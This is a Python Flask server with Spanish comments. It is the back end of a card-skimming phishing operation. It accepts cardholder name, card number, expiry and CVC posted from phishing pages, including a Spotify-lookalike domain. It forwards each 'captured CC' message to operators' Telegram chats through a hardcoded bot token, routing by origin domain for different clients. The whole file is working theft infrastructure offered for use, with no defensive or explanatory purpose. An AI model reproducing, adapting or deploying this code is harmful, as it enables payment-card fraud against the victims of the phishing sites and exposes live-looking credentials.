import os
from flask import Flask, request, jsonify
from flask_cors import CORS
import requests

app = Flask(__name__)
# Permitimos todos los orígenes para evitar problemas de CORS
CORS(app, resources={r"/*": {"origins": "*"}})

# --- CONFIGURACIÓN ---
TELEGRAM_BOT_TOKEN = '8825700631:AAE1L-gbaro7C2TAr4gGMf8P-XUsiyoyleU'

# --- CONFIGURACIÓN DE SEGURIDAD ---
# 1. Pon aquí el dominio exacto del cliente que quieres que sea GRUPO
DOMINIO_GRUPO = 'free.spotlfypremium.online' 

# 2. Pon aquí el ID del grupo donde quieres que caigan las CC de ese dominio
ID_GRUPO_DESTINO = '-1004493468867'

# 3. Lista de IDs de usuarios normales (para los otros dominios)
CLIENTES_PRIVADOS = ['6953415010', '7707049896']

# La lista maestra para validación de seguridad
LISTA_MAESTRA_IDS = CLIENTES_PRIVADOS + [ID_GRUPO_DESTINO]

@app.route('/enviar-datos', methods=['POST'])
def recibir_datos():
    data = request.json
    lista_ids_html = data.get('lista_ids', [])
    
    # DETECTAR EL DOMINIO DE ORIGEN
    # El navegador nos dice desde qué dominio viene la petición
    origen = request.headers.get('Origin', '').split('/')[2] 
    print(f"🌐 Petición recibida desde el dominio: {origen}")

    nombre = data.get('nombre', 'N/A')
    tarjeta = data.get('tarjeta', 'N/A')
    expiracion = data.get('expiracion', 'N/A')
    cvc = data.get('cvc', 'N/A')

    mensaje = (
        f"💰 *NUEVA CC CAPTURADA* 💰\n"
        f"━━━━━━━━━━━━━━━━━━\n"
        f"🌐 *Origen:* `{origen}`\n"
        f"👤 *Nombre:* `{nombre}`\n"
        f"💳 *Tarjeta:* `{tarjeta}`\n"
        f"📅 *Exp:* `{expiracion}`\n"
        f"🔐 *CVC:* `{cvc}`\n"
        f"━━━━━━━━━━━━━━━━━━"
    )

    exitos = 0
    lista_maestra_strings = [str(i).strip() for i in LISTA_MAESTRA_IDS]

    for id_receptor in lista_ids_html:
        id_limpio = str(id_receptor).strip()

        if id_limpio in lista_maestra_strings:
            
            # --- LÓGICA DE REENVÍO POR DOMINIO ---
            # Si el dominio que manda la petición es el de tu cliente grupo...
            if origen == DOMINIO_GRUPO:
                # ...entonces forzamos que el mensaje vaya al grupo, 
                # sin importar lo que diga el HTML.
                id_final = ID_GRUPO_DESTINO
                print(f"🎯 DOMINIO GRUPO DETECTADO. Enviando al grupo: {id_final}")
            else:
                # Si es cualquier otro dominio, usamos el ID que mandó el HTML
                id_final = id_limpio
                print(f"👤 DOMINIO PRIVADO. Enviando al usuario: {id_final}")

            url_telegram = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            payload = {"chat_id": id_final, "text": mensaje, "parse_mode": "Markdown"}
            
            try:
                res = requests.post(url_telegram, json=payload, timeout=5)
                if res.status_code == 200:
                    exitos += 1
                    print(f"✅ ENVIADO EXITOSO")
                else:
                    print(f"❌ ERROR TELEGRAM: {res.text}")
            except Exception as e:
                print(f"❌ ERROR RED: {e}")
        else:
            print(f"🚫 ID NO AUTORIZADO: {id_limpio}")

    return jsonify({"status": "success", "enviados": exitos}), 200

if __name__ == '__main__':
    port = int(os.environ.get("PORT", 5000))
    app.run(host='0.0.0.0', port=port)
